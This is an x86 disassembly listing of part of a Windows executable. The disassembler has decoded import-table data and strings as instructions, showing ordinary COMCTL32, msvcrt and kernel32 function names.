  42800a:	add    BYTE PTR [ebx-0x77],cl
  42800d:	add    al,BYTE PTR [eax]
  42800f:	pop    ebx
  428010:	mov    DWORD PTR [edx],eax
  428012:	add    BYTE PTR [ebp-0x77],dh
  428015:	add    al,BYTE PTR [eax]
  428017:	test   DWORD PTR [ecx-0x7664fffe],ecx
  42801d:	add    al,BYTE PTR [eax]
  42801f:	stos   DWORD PTR es:[edi],eax
  428020:	mov    DWORD PTR [edx],eax
  428022:	add    BYTE PTR [edi-0x34fffd77],dh
  428028:	mov    DWORD PTR [edx],eax
  42802a:	add    bl,ah
  42802c:	mov    DWORD PTR [edx],eax
  42802e:	add    bh,ch
  428030:	mov    DWORD PTR [edx],eax
  428032:	add    bh,bh
  428034:	mov    DWORD PTR [edx],eax
  428036:	add    BYTE PTR [ebx],cl
  428038:	mov    al,BYTE PTR [edx]
  42803a:	add    BYTE PTR [edi],dl
  42803c:	mov    al,BYTE PTR [edx]
  42803e:	add    BYTE PTR ds:0x2f00028a,ah
  428044:	mov    al,BYTE PTR [edx]
  428046:	add    BYTE PTR [edi],bh
  428048:	mov    al,BYTE PTR [edx]
  42804a:	add    BYTE PTR [ecx-0x76],dl
  42804d:	add    al,BYTE PTR [eax]
  42804f:	pop    ebp
  428050:	mov    al,BYTE PTR [edx]
  428052:	add    BYTE PTR [edi-0x76],ch
  428055:	add    al,BYTE PTR [eax]
  428057:	jnp    0x427fe3
  428059:	add    al,BYTE PTR [eax]
  42805b:	xchg   DWORD PTR [edx-0x7568fffe],ecx
  428061:	add    al,BYTE PTR [eax]
  428063:	lods   eax,DWORD PTR ds:[esi]
  428064:	mov    al,BYTE PTR [edx]
  428066:	add    BYTE PTR [ebx-0x32fffd76],bh
  42806c:	mov    al,BYTE PTR [edx]
  42806e:	add    ch,bl
  428070:	mov    al,BYTE PTR [edx]
  428072:	add    ch,ch
  428074:	mov    al,BYTE PTR [edx]
  428076:	add    BYTE PTR [ecx],cl
  428078:	mov    eax,DWORD PTR [edx]
  42807a:	add    BYTE PTR [ecx],bl
  42807c:	mov    eax,DWORD PTR [edx]
  42807e:	add    BYTE PTR [ecx],ch
  428080:	mov    eax,DWORD PTR [edx]
  428082:	add    BYTE PTR [edi],dh
  428084:	mov    eax,DWORD PTR [edx]
  428086:	add    BYTE PTR [ebp-0x75],cl
  428089:	add    al,BYTE PTR [eax]
  42808b:	pop    ebx
  42808c:	mov    eax,DWORD PTR [edx]
  42808e:	add    BYTE PTR [ebp-0x75],ah
  428091:	add    al,BYTE PTR [eax]
  428093:	jno    0x428020
  428095:	add    al,BYTE PTR [eax]
  428097:	or     DWORD PTR [ebx-0x7464fffe],0x2
  42809e:	add    BYTE PTR [ebp-0x42fffd75],ch
  4280a4:	mov    eax,DWORD PTR [edx]
  4280a6:	add    cl,dl
  4280a8:	mov    eax,DWORD PTR [edx]
  4280aa:	add    cl,ah
  4280ac:	mov    eax,DWORD PTR [edx]
  4280ae:	add    bh,dh
  4280b0:	mov    eax,DWORD PTR [edx]
  4280b2:	add    BYTE PTR ds:0x1900028c,al
  4280b8:	mov    WORD PTR [edx],es
  4280ba:	add    BYTE PTR [edi],ah
  4280bc:	mov    WORD PTR [edx],es
  4280be:	add    BYTE PTR [ecx],bh
  4280c0:	mov    WORD PTR [edx],es
  4280c2:	add    BYTE PTR [ebx-0x74],cl
  4280c5:	add    al,BYTE PTR [eax]
  4280c7:	pop    ebp
  4280c8:	mov    WORD PTR [edx],es
  4280ca:	add    BYTE PTR [ecx-0x74],ch
  4280cd:	add    al,BYTE PTR [eax]
  4280cf:	ja     0x42805d
  4280d1:	add    al,BYTE PTR [eax]
  4280d3:	lea    ecx,[edx+eax*1+0x28ca100]
  4280da:	add    BYTE PTR [ebp-0x38fffd74],dh
  4280e0:	mov    WORD PTR [edx],es
  4280e2:	add    cl,dl
  4280e4:	mov    WORD PTR [edx],es
  4280e6:	add    bl,ah
  4280e8:	mov    WORD PTR [edx],es
  4280ea:	add    bh,dh
  4280ec:	mov    WORD PTR [edx],es
  4280ee:	add    BYTE PTR [ebx],cl
  4280f0:	lea    eax,[edx]
  4280f2:	add    BYTE PTR [ebx],bl
  4280f4:	lea    eax,[edx]
  4280f6:	add    BYTE PTR [ecx],ch
  4280f8:	lea    eax,[edx]
  4280fa:	add    BYTE PTR [ebx-0x73],al
  4280fd:	add    al,BYTE PTR [eax]
  4280ff:	pop    ebx
  428100:	lea    eax,[edx]
  428102:	add    BYTE PTR [ecx-0x73],ch
  428105:	add    al,BYTE PTR [eax]
  428107:	jnp    0x428096
  428109:	add    al,BYTE PTR [eax]
  42810b:	mov    DWORD PTR [ebp-0x726afffe],ecx
  428111:	add    al,BYTE PTR [eax]
  428113:	scas   eax,DWORD PTR es:[edi]
  428114:	lea    eax,[edx]
  428116:	add    cl,al
  428118:	lea    eax,[edx]
  42811a:	add    bl,dl
  42811c:	lea    eax,[edx]
  42811e:	add    bl,ah
  428120:	lea    eax,[edx]
  428122:	add    bl,dh
  428124:	lea    eax,[edx]
  428126:	add    ch,bh
  428128:	lea    eax,[edx]
  42812a:	add    BYTE PTR ds:0x1f00028e,cl
  428130:	mov    es,WORD PTR [edx]
  428132:	add    BYTE PTR [edi],ch
  428134:	mov    es,WORD PTR [edx]
  428136:	add    BYTE PTR [ebp-0x72],al
  428139:	add    al,BYTE PTR [eax]
  42813b:	pop    ebp
  42813c:	mov    es,WORD PTR [edx]
  42813e:	add    BYTE PTR [edi-0x72],ch
  428141:	add    al,BYTE PTR [eax]
  428143:	jg     0x4280d3
  428145:	add    al,BYTE PTR [eax]
  428147:	xchg   ecx,eax
  428148:	mov    es,WORD PTR [edx]
  42814a:	add    BYTE PTR [edi-0x4efffd72],bl
  428150:	mov    es,WORD PTR [edx]
  428152:	add    BYTE PTR [edi-0x2efffd72],bh
  428158:	mov    es,WORD PTR [edx]
  42815a:	add    bl,ah
  42815c:	mov    es,WORD PTR [edx]
  42815e:	add    bh,dh
  428160:	mov    es,WORD PTR [edx]
  428162:	add    BYTE PTR [ebx],cl
  428164:	pop    DWORD PTR [edx]
  428166:	add    BYTE PTR ds:0x3300028f,bl
  42816c:	pop    DWORD PTR [edx]
  42816e:	add    BYTE PTR [ebp-0x71],al
  428171:	add    al,BYTE PTR [eax]
  428173:	popa   
  428174:	pop    DWORD PTR [edx]
  428176:	add    BYTE PTR [edi-0x71],dh
  428179:	add    al,BYTE PTR [eax]
  42817b:	test   DWORD PTR [edi-0x7066fffe],ecx
  428181:	add    al,BYTE PTR [eax]
  428183:	add    BYTE PTR [eax],al
  428185:	add    BYTE PTR [eax],al
  428187:	mov    bl,0x8f
  428189:	add    al,BYTE PTR [eax]
  42818b:	ret    
  42818c:	pop    DWORD PTR [edx]
  42818e:	add    bl,bl
  428190:	pop    DWORD PTR [edx]
  428192:	add    ch,ah
  428194:	pop    DWORD PTR [edx]
  428196:	add    ch,dh
  428198:	pop    DWORD PTR [edx]
  42819a:	add    BYTE PTR [ecx],cl
  42819c:	nop
  42819d:	add    al,BYTE PTR [eax]
  42819f:	pop    ss
  4281a0:	nop
  4281a1:	add    al,BYTE PTR [eax]
  4281a3:	sub    edx,DWORD PTR [eax-0x6fc0fffe]
  4281a9:	add    al,BYTE PTR [eax]
  4281ab:	dec    edi
  4281ac:	nop
  4281ad:	add    al,BYTE PTR [eax]
  4281af:	pop    ebp
  4281b0:	nop
  4281b1:	add    al,BYTE PTR [eax]
  4281b3:	addr16 nop
  4281b5:	add    al,BYTE PTR [eax]
  4281b7:	jns    0x428149
  4281b9:	add    al,BYTE PTR [eax]
  4281bb:	lea    edx,[eax-0x6f66fffe]
  4281c1:	add    al,BYTE PTR [eax]
  4281c3:	scas   eax,DWORD PTR es:[edi]
  4281c4:	nop
  4281c5:	add    al,BYTE PTR [eax]
  4281c7:	ret    
  4281c8:	nop
  4281c9:	add    al,BYTE PTR [eax]
  4281cb:	rcl    DWORD PTR [eax-0x6f1afffe],1
  4281d1:	add    al,BYTE PTR [eax]
  4281d3:	stc    
  4281d4:	nop
  4281d5:	add    al,BYTE PTR [eax]
  4281d7:	add    eax,0x11000291
  4281dc:	xchg   ecx,eax
  4281dd:	add    al,BYTE PTR [eax]
  4281df:	daa    
  4281e0:	xchg   ecx,eax
  4281e1:	add    al,BYTE PTR [eax]
  4281e3:	xor    eax,0x41000291
  4281e8:	xchg   ecx,eax
  4281e9:	add    al,BYTE PTR [eax]
  4281eb:	push   ebx
  4281ec:	xchg   ecx,eax
  4281ed:	add    al,BYTE PTR [eax]
  4281ef:	imul   edx,DWORD PTR [ecx-0x6e88fffe],0x918b0002
  4281f9:	add    al,BYTE PTR [eax]
  4281fb:	fwait
  4281fc:	xchg   ecx,eax
  4281fd:	add    al,BYTE PTR [eax]
  4281ff:	stos   DWORD PTR es:[edi],eax
  428200:	xchg   ecx,eax
  428201:	add    al,BYTE PTR [eax]
  428203:	mov    ecx,0xc3000291
  428208:	xchg   ecx,eax
  428209:	add    al,BYTE PTR [eax]
  42820b:	int    0x91
  42820d:	add    al,BYTE PTR [eax]
  42820f:	fst    DWORD PTR [ecx-0x6e1afffe]
  428215:	add    al,BYTE PTR [eax]
  428217:	not    DWORD PTR [ecx-0x6df2fffe]
  42821d:	add    al,BYTE PTR [eax]
  42821f:	daa    
  428220:	xchg   edx,eax
  428221:	add    al,BYTE PTR [eax]
  428223:	aaa    
  428224:	xchg   edx,eax
  428225:	add    al,BYTE PTR [eax]
  428227:	inc    ecx
  428228:	xchg   edx,eax
  428229:	add    al,BYTE PTR [eax]
  42822b:	push   ecx
  42822c:	xchg   edx,eax
  42822d:	add    al,BYTE PTR [eax]
  42822f:	arpl   WORD PTR [edx-0x6d8efffe],dx
  428235:	add    al,BYTE PTR [eax]
  428237:	mov    edx,DWORD PTR [edx+0x2]
  42823d:	add    BYTE PTR [eax],al
  42823f:	pop    esp
  428240:	add    BYTE PTR [eax+0x72],dl
  428243:	outs   dx,DWORD PTR ds:[esi]
  428244:	jo     0x4282ab
  428246:	jb     0x4282bc
  428248:	jns    0x42829d
  42824a:	push   0x57746565
  42824f:	add    BYTE PTR [eax],al
  428251:	push   ebx
  428252:	add    BYTE PTR [ecx+0x6d],cl
  428255:	popa   
  428256:	addr16 gs dec esp
  428259:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  428260:	dec    ecx
  428261:	arpl   WORD PTR [edi+0x6e],bp
  428264:	push   ebx
  428265:	imul   edi,DWORD PTR [edx+0x65],0x49004e00
  42826c:	ins    DWORD PTR es:[edi],dx
  42826d:	popa   
  42826e:	addr16 gs dec esp
  428271:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428278:	ins    BYTE PTR es:[edi],dx
  428279:	popa   
  42827a:	arpl   WORD PTR [ebp+0x49],sp
  42827d:	arpl   WORD PTR [edi+0x6e],bp
  428280:	add    BYTE PTR [eax+eax*1],ch
  428283:	dec    ecx
  428284:	ins    DWORD PTR es:[edi],dx
  428285:	popa   
  428286:	addr16 gs dec esp
  428289:	imul   esi,DWORD PTR [ebx+0x74],0x6464415f
  428290:	dec    ebp
  428291:	popa   
  428292:	jae    0x4282ff
  428294:	gs add BYTE PTR fs:[eax],dh
  428298:	add    BYTE PTR [ecx+0x6d],cl
  42829b:	popa   
  42829c:	addr16 gs dec esp
  42829f:	imul   esi,DWORD PTR [ebx+0x74],0x6572435f
  4282a6:	popa   
  4282a7:	je     0x42830e
  4282a9:	add    BYTE PTR [eax],al
  4282ab:	inc    ebp
  4282ac:	add    BYTE PTR [ecx+0x6d],cl
  4282af:	popa   
  4282b0:	addr16 gs dec esp
  4282b3:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4282ba:	fs dec ecx
  4282bc:	ins    DWORD PTR es:[edi],dx
  4282bd:	popa   
  4282be:	addr16 gs push edi
  4282c1:	add    BYTE PTR [eax],al
  4282c3:	inc    ebx
  4282c4:	dec    edi
  4282c5:	dec    ebp
  4282c6:	inc    ebx
  4282c7:	push   esp
  4282c8:	dec    esp
  4282c9:	xor    esi,DWORD PTR [edx]
  4282cb:	cs fs ins BYTE PTR es:[edi],dx
  4282ce:	ins    BYTE PTR es:[edi],dx
  4282cf:	add    BYTE PTR [eax],al
  4282d1:	cmc    
  4282d2:	add    BYTE PTR [edi+0x63],bl
  4282d5:	outs   dx,DWORD PTR ds:[esi]
  4282d6:	outs   dx,BYTE PTR ds:[esi]
  4282d7:	je     0x42834b
  4282d9:	outs   dx,DWORD PTR ds:[esi]
  4282da:	ins    BYTE PTR es:[edi],dx
  4282db:	data16 jo 0x4282de
  4282de:	add    BYTE PTR [ebx+0x3],bl
  4282e1:	bound  esi,QWORD PTR [ebx+0x65]
  4282e4:	popa   
  4282e5:	jb     0x42834a
  4282e7:	push   0x69039b00
  4282ec:	jae    0x42835e
  4282ee:	jb     0x428359
  4282f0:	outs   dx,BYTE PTR ds:[esi]
  4282f1:	je     0x4282f3
  4282f3:	test   BYTE PTR [ebx],0x73
  4282f6:	je     0x42836a
  4282f8:	jb     0x42835d
  4282fa:	push   0xb30072
  4282ff:	pop    edi
  428300:	pop    edi
  428301:	jae    0x428368
  428303:	je     0x428364
  428305:	popa   
  428306:	jo     0x428378
  428308:	pop    edi
  428309:	je     0x428384
  42830b:	jo     0x428372
  42830d:	add    BYTE PTR [eax],al
  42830f:	mov    al,ds:0x705f5f00
  428314:	pop    edi
  428315:	pop    edi
  428316:	ins    WORD PTR es:[edi],dx
  428318:	outs   dx,DWORD PTR ds:[esi]
  428319:	fs add BYTE PTR gs:[eax],al
  42831d:	jge    0x428322
  42831f:	data16 jb 0x428387
  428322:	add    BYTE PTR gs:[eax],al
  428325:	fwait
  428326:	add    BYTE PTR [edi+0x5f],bl
  428329:	jo     0x42838a
  42832b:	pop    edi
  42832c:	arpl   WORD PTR [edi+0x6d],bp
  42832f:	ins    DWORD PTR es:[edi],dx
  428330:	outs   dx,DWORD PTR ds:[esi]
  428331:	fs add BYTE PTR gs:[eax],al
  428335:	and    eax,0x73637704
  42833a:	ins    BYTE PTR es:[edi],dx
  42833b:	outs   dx,BYTE PTR gs:[esi]
  42833d:	add    BYTE PTR [eax],al
  42833f:	and    DWORD PTR [edi+esi*2],eax
  428342:	arpl   WORD PTR [ebx+0x63],si
  428345:	jo     0x4283c0
  428347:	add    BYTE PTR [eax],al
  428349:	or     al,BYTE PTR [esp+esi*2]
  42834c:	outs   dx,DWORD PTR ds:[esi]
  42834d:	jne    0x4283bf
  42834f:	jo     0x4283b6
  428351:	jb     0x428353
  428353:	rol    BYTE PTR [ebx],cl
  428355:	jb     0x4283bc
  428357:	ins    DWORD PTR es:[edi],dx
  428358:	outs   dx,DWORD PTR ds:[esi]
  428359:	jbe    0x4283c0
  42835b:	add    BYTE PTR [eax],al
  42835d:	xchg   edi,eax
  42835e:	add    ebp,DWORD PTR [ecx+0x73]
  428361:	imul   esp,DWORD PTR fs:[edi+0x69],0x3ea0074
  428369:	jae    0x4283df
  42836b:	jb     0x4283d0
  42836d:	jae    0x4283df
  42836f:	outs   dx,BYTE PTR ds:[esi]
  428370:	add    BYTE PTR [edi+0x74656703],cl
  428376:	jae    0x428378
  428378:	add    bh,cl
  42837a:	add    esi,DWORD PTR [edx+0x61]
  42837d:	outs   dx,BYTE PTR ds:[esi]
  42837e:	add    BYTE PTR fs:[eax],al
  428381:	mov    ch,0x3
  428383:	ins    DWORD PTR es:[edi],dx
  428384:	popa   
  428385:	ins    BYTE PTR es:[edi],dx
  428386:	ins    BYTE PTR es:[edi],dx
  428387:	outs   dx,DWORD PTR ds:[esi]
  428388:	arpl   WORD PTR [eax],ax
  42838a:	add    al,cl
  42838c:	add    esi,DWORD PTR [eax+0x75]
  42838f:	je     0x4283f4
  428391:	push   0x1c007261
  428396:	add    al,0x77
  428398:	arpl   WORD PTR [ebx+0x63],si
  42839b:	popa   
  42839c:	je     0x42839e
  42839e:	add    BYTE PTR [eax+0x3],ah
  4283a1:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4283a5:	imul   eax,DWORD PTR [eax],0xffffffdb
  4283a8:	add    BYTE PTR [edi+0x61],bl
  4283ab:	ins    DWORD PTR es:[edi],dx
  4283ac:	jae    0x428415
  4283ae:	pop    edi
  4283af:	gs js  0x42841b
  4283b2:	je     0x4283b4
  4283b4:	add    BYTE PTR [edi+0x77736903],ah
  4283ba:	jo     0x42842e
  4283bc:	imul   ebp,DWORD PTR [esi+0x74],0x1860000
  4283c3:	pop    edi
  4283c4:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  4283cb:	ins    DWORD PTR es:[edi],dx
  4283cc:	add    bl,ch
  4283ce:	add    esi,DWORD PTR [ebx+0x74]
  4283d1:	jb     0x428438
  4283d3:	jb     0x428447
  4283d5:	outs   dx,DWORD PTR ds:[esi]
  4283d6:	jb     0x4283d8
  4283d8:	add    ch,bh
  4283da:	add    esi,DWORD PTR [ebx+0x74]
  4283dd:	jb     0x428453
  4283df:	outs   dx,DWORD PTR ds:[esi]
  4283e0:	jne    0x42844e
  4283e2:	add    bh,bh
  4283e4:	add    esi,DWORD PTR [ebx+0x77]
  4283e7:	jo     0x42845b
  4283e9:	imul   ebp,DWORD PTR [esi+0x74],0x9e000066
  4283f0:	add    DWORD PTR [edi+0x69],ebx
  4283f3:	jae    0x428462
  4283f5:	bound  esp,QWORD PTR [edx+0x6c]
  4283f8:	gs popa 
  4283fa:	add    BYTE PTR fs:[eax],al
  4283fd:	fld    DWORD PTR [ebx]
  4283ff:	jae    0x428466
  428401:	je     0x428479
  428403:	bound  esi,QWORD PTR [ebp+0x66]
  428406:	add    BYTE PTR ds:0x676e7504,cl
  42840c:	gs je  0x428472
  42840f:	add    BYTE PTR [eax],al
  428411:	push   edx
  428412:	add    BYTE PTR [edi+0x58],bl
  428415:	arpl   WORD PTR [eax+0x74],si
  428418:	inc    esi
  428419:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  428421:	pop    edi
  428422:	gs js  0x42848e
  428425:	je     0x428427
  428427:	in     eax,0x3
  428429:	jae    0x42849f
  42842b:	jb     0x428490
  42842d:	push   0xf2000072
  428432:	add    esi,DWORD PTR [ebx+0x74]
  428435:	jb     0x4284a5
  428437:	arpl   WORD PTR [eax+0x79],si
  42843a:	add    al,ch
  42843c:	add    BYTE PTR [edi+0x63],bl
  42843f:	gs js  0x4284ab
  428442:	je     0x428444
  428444:	add    BYTE PTR [ebp+0x3],ch
  428447:	data16 addr16 gs je 0x4284af
  42844c:	add    BYTE PTR ds:0x73637704,ch
  428452:	jb     0x4284b7
  428454:	push   0x4200072
  428459:	ja     0x4284be
  42845b:	jae    0x4284c0
  42845d:	outs   dx,DWORD PTR ds:[esi]
  42845e:	ins    BYTE PTR es:[edi],dx
  42845f:	ins    BYTE PTR es:[edi],dx
  428460:	add    cl,ah
  428462:	add    esi,DWORD PTR [ebx+0x73]
  428465:	arpl   WORD PTR [ecx+0x6e],sp
  428468:	data16 add BYTE PTR [eax],al
  42846b:	mov    ch,0x0
  42846d:	pop    edi
  42846e:	pop    edi
  42846f:	jae    0x4284d6
  428471:	je     0x4284e8
  428473:	jae    0x4284da
  428475:	jb     0x4284e4
  428477:	popa   
  428478:	je     0x4284e2
  42847a:	gs jb  0x4284ef
  42847d:	add    BYTE PTR [eax],al
  42847f:	mov    BYTE PTR [ebx],al
  428481:	data16 ja 0x4284f6
  428484:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7303f500
  42848c:	je     0x428500
  42848e:	jo     0x4284f2
  428490:	jb     0x4284fd
  428492:	add    ah,cl
  428494:	add    esi,DWORD PTR [ecx+0x73]
  428497:	outs   dx,DWORD PTR ds:[esi]
  428498:	jb     0x42850e
  42849a:	add    BYTE PTR [edx+0x0],dh
  42849d:	pop    edi
  42849e:	pop    edi
  42849f:	addr16 gs je 0x428510
  4284a3:	popa   
  4284a4:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  4284ab:	cli    
  4284ac:	add    esi,DWORD PTR [ebx+0x74]
  4284af:	jb     0x428525
  4284b1:	outs   dx,DWORD PTR ds:[esi]
  4284b2:	imul   eax,DWORD PTR [eax],0x0
  4284b5:	dec    ebp
  4284b6:	push   ebx
  4284b7:	push   esi
  4284b8:	inc    ebx
  4284b9:	push   edx
  4284ba:	push   esp
  4284bb:	cs fs ins BYTE PTR es:[edi],dx
  4284be:	ins    BYTE PTR es:[edi],dx
  4284bf:	add    BYTE PTR [eax],al
  4284c1:	je     0x4284c5
  4284c3:	inc    edi
  4284c4:	gs je  0x42851c
  4284c7:	jae    0x42852e
  4284c9:	jb     0x42850f
  4284cb:	gs popaw 
  4284ce:	jne    0x42853c
  4284d0:	je     0x42851e
  4284d2:	popa   
  4284d3:	outs   dx,BYTE PTR ds:[esi]
  4284d4:	addr16 dec ecx
  4284d6:	inc    esp
  4284d7:	add    BYTE PTR [eax],al
  4284d9:	jnp    0x4284dc
  4284db:	inc    esi
  4284dc:	outs   dx,DWORD PTR ds:[esi]
  4284dd:	ins    BYTE PTR es:[edi],dx
  4284de:	fs push ebx
  4284e0:	je     0x428554
  4284e2:	imul   ebp,DWORD PTR [esi+0x67],0x4280057
  4284e9:	push   ebx
  4284ea:	gs je  0x42853d
  4284ed:	jb     0x428558
  4284ef:	outs   dx,DWORD PTR ds:[esi]
  4284f0:	jb     0x42855b
  4284f2:	je     0x42856d
  4284f4:	inc    ebx
  4284f5:	ins    BYTE PTR es:[edi],dx
  4284f6:	popa   
  4284f7:	jae    0x42856c
  4284f9:	add    BYTE PTR [eax],al
  4284fb:	pop    ebp
  4284fc:	add    DWORD PTR [esi+0x69],eax
  4284ff:	outs   dx,BYTE PTR ds:[esi]
  428500:	fs inc esi
  428502:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  428509:	gs inc ecx
  42850b:	add    BYTE PTR [eax],al
  42850d:	or     al,BYTE PTR [ebx]
  42850f:	dec    esp
  428510:	outs   dx,DWORD PTR ds:[esi]
  428511:	popa   
  428512:	fs push edx
  428514:	gs jae 0x428586
  428517:	jne    0x42858b
  428519:	arpl   WORD PTR [ebp+0x0],sp
  42851c:	add    BYTE PTR ds:0x74655304,bl
  428522:	dec    eax
  428523:	popa   
  428524:	outs   dx,BYTE PTR ds:[esi]
  428525:	fs ins BYTE PTR es:[edi],dx
  428527:	gs inc ebx
  428529:	outs   dx,DWORD PTR ds:[esi]
  42852a:	jne    0x42859a
  42852c:	je     0x42852e
  42852e:	add    BYTE PTR [ecx+0x3],bl
  428531:	push   eax
  428532:	jne    0x4285a0
  428534:	jae    0x42859b
  428536:	inc    ebp
  428537:	jbe    0x42859e
  428539:	outs   dx,BYTE PTR ds:[esi]
  42853a:	je     0x42853c
  42853c:	add    BYTE PTR ds:0x74655304,dl
  428542:	inc    esi
  428543:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  42854b:	outs   dx,DWORD PTR ds:[esi]
  42854c:	dec    edi
  42854d:	inc    ebp
  42854e:	dec    ebp
  42854f:	add    BYTE PTR [eax],al
  428551:	mov    al,BYTE PTR [edx]
  428553:	inc    edi
  428554:	ins    BYTE PTR es:[edi],dx
  428555:	outs   dx,DWORD PTR ds:[esi]
  428556:	bound  esp,QWORD PTR [ecx+0x6c]
  428559:	inc    ebx
  42855a:	outs   dx,DWORD PTR ds:[esi]
  42855b:	ins    DWORD PTR es:[edi],dx
  42855c:	jo     0x4285bf
  42855e:	arpl   WORD PTR [eax+eax*1+0x9],si
  428562:	add    al,BYTE PTR [edi+0x65]
  428565:	je     0x4285b4
  428567:	outs   dx,DWORD PTR ds:[esi]
  428568:	fs jne 0x4285d7
  42856b:	gs inc esi
  42856d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  428575:	add    BYTE PTR [eax],al
  428577:	mov    eax,DWORD PTR [edx]
  428579:	inc    edi
  42857a:	ins    BYTE PTR es:[edi],dx
  42857b:	outs   dx,DWORD PTR ds:[esi]
  42857c:	bound  esp,QWORD PTR [ecx+0x6c]
  42857f:	inc    esp
  428580:	gs ins BYTE PTR es:[edi],dx
  428582:	gs je  0x4285ea
  428585:	inc    ecx
  428586:	je     0x4285f7
  428588:	ins    DWORD PTR es:[edi],dx
  428589:	add    BYTE PTR [eax],al
  42858b:	and    DWORD PTR [ebx+edx*2],eax
  42858e:	gs je  0x4285dd
  428591:	popa   
  428592:	jae    0x428608
  428594:	inc    ebp
  428595:	jb     0x428609
  428597:	outs   dx,DWORD PTR ds:[esi]
  428598:	jb     0x42859a
  42859a:	add    BYTE PTR [ebp+0x4],cl
  42859d:	push   ebx
  42859e:	ins    BYTE PTR es:[edi],dx
  42859f:	gs gs jo 0x4285a3
  4285a3:	inc    eax
  4285a4:	add    al,0x53
  4285a6:	gs je  0x4285fd
  4285a9:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4285b0:	jne    0x428617
  4285b2:	push   esp
  4285b3:	imul   ebp,DWORD PTR [ebp+0x65],0xf3000072
  4285ba:	add    al,0x56
  4285bc:	imul   esi,DWORD PTR [edx+0x74],0x556c6175
  4285c3:	outs   dx,BYTE PTR ds:[esi]
  4285c4:	ins    BYTE PTR es:[edi],dx
  4285c5:	outs   dx,DWORD PTR ds:[esi]
  4285c6:	arpl   WORD PTR [ebx+0x0],bp
  4285c9:	ret    
  4285ca:	add    al,0x6c
  4285cc:	jae    0x428642
  4285ce:	jb     0x428633
  4285d0:	ins    DWORD PTR es:[edi],dx
  4285d1:	jo     0x42862a
  4285d3:	add    BYTE PTR [eax],al
  4285d5:	dec    esp
  4285d6:	add    al,0x53
  4285d8:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  4285df:	jae    0x428650
  4285e1:	jne    0x428655
  4285e3:	arpl   WORD PTR [ebp+0x0],sp
  4285e6:	add    BYTE PTR [edx+0x74654701],cl
  4285ec:	inc    ecx
  4285ed:	inc    ebx
  4285ee:	push   eax
  4285ef:	add    BYTE PTR [eax],al
  4285f1:	jno    0x4285f5
  4285f3:	inc    edi
  4285f4:	gs je  0x42864b
  4285f7:	imul   ebp,DWORD PTR [ebp+0x65],0x656e6f5a
  4285fe:	dec    ecx
  4285ff:	outs   dx,BYTE PTR ds:[esi]
  428600:	outs   dx,WORD PTR ds:[esi]
  428602:	jb     0x428671
  428604:	popa   
  428605:	je     0x428670
  428607:	outs   dx,DWORD PTR ds:[esi]
  428608:	outs   dx,BYTE PTR ds:[esi]
  428609:	add    BYTE PTR [eax],al
  42860b:	jae    0x42860f
  42860d:	inc    edi
  42860e:	gs je  0x428666
  428611:	jae    0x428678
  428613:	jb     0x428659
  428615:	gs popaw 
  428618:	jne    0x428686
  42861a:	je     0x428668
  42861c:	inc    ebx
  42861d:	dec    ecx
  42861e:	inc    esp
  42861f:	add    BYTE PTR [eax],al
  428621:	mov    al,0x3
  428623:	push   edx
  428624:	gs ins BYTE PTR es:[edi],dx
  428626:	gs popa 
  428628:	jae    0x42868f
  42862a:	push   ebx
  42862b:	gs ins DWORD PTR es:[edi],dx
  42862d:	popa   
  42862e:	jo     0x428698
  428630:	outs   dx,DWORD PTR ds:[esi]
  428631:	jb     0x428698
  428633:	add    BYTE PTR [eax],al
  428635:	ins    DWORD PTR es:[edi],dx
  428636:	add    al,BYTE PTR [edi+0x65]
  428639:	je     0x42868f
  42863b:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  428642:	je     0x428644
  428644:	add    dh,al
  428646:	add    al,0x6c
  428648:	jae    0x4286be
  42864a:	jb     0x4286af
  42864c:	ins    DWORD PTR es:[edi],dx
  42864d:	jo     0x4286b8
  42864f:	push   edi
  428650:	add    bl,bl
  428652:	add    cl,BYTE PTR [ecx+0x73]
  428655:	push   esi
  428656:	popa   
  428657:	ins    BYTE PTR es:[edi],dx
  428658:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  428660:	add    dl,al
  428662:	add    al,0x6c
  428664:	jae    0x4286da
  428666:	jb     0x4286cb
  428668:	ins    DWORD PTR es:[edi],dx
  428669:	jo     0x4286ac
  42866b:	add    BYTE PTR [eax],al
  42866d:	in     al,0x3
  42866f:	push   ebx
  428670:	gs je  0x4286b6
  428673:	outs   dx,DWORD PTR ds:[esi]
  428674:	ins    DWORD PTR es:[edi],dx
  428675:	ins    DWORD PTR es:[edi],dx
  428676:	push   esp
  428677:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  42867e:	add    BYTE PTR [edx+0x65724601],al
  428684:	gs dec esp
  428686:	imul   esp,DWORD PTR [edx+0x72],0x797261
  42868d:	pop    DWORD PTR [edx]
  42868f:	inc    edi
  428690:	ins    BYTE PTR es:[edi],dx
  428691:	outs   dx,DWORD PTR ds:[esi]
  428692:	bound  esp,QWORD PTR [ecx+0x6c]
  428695:	inc    esi
  428696:	ins    BYTE PTR es:[edi],dx
  428697:	popa   
  428698:	addr16 jae 0x42869b
  42869b:	into   
  42869c:	add    al,0x6c
  42869e:	jae    0x428714
  4286a0:	jb     0x42870e
  4286a2:	outs   dx,BYTE PTR gs:[esi]
  4286a4:	inc    ecx
  4286a5:	add    BYTE PTR [eax],al
  4286a7:	sbb    BYTE PTR [ebx+edx*2],al
  4286aa:	gs je  0x4286f3
  4286ad:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4286b5:	gs jb  0x4286b8
  4286b8:	add    BYTE PTR [eax+0x2],ah
  4286bb:	inc    edi
  4286bc:	gs je  0x428713
  4286bf:	gs ins DWORD PTR es:[edi],dx
  4286c1:	jo     0x428709
  4286c3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  4286cb:	add    BYTE PTR [eax],al
  4286cd:	sub    eax,0x6e694601
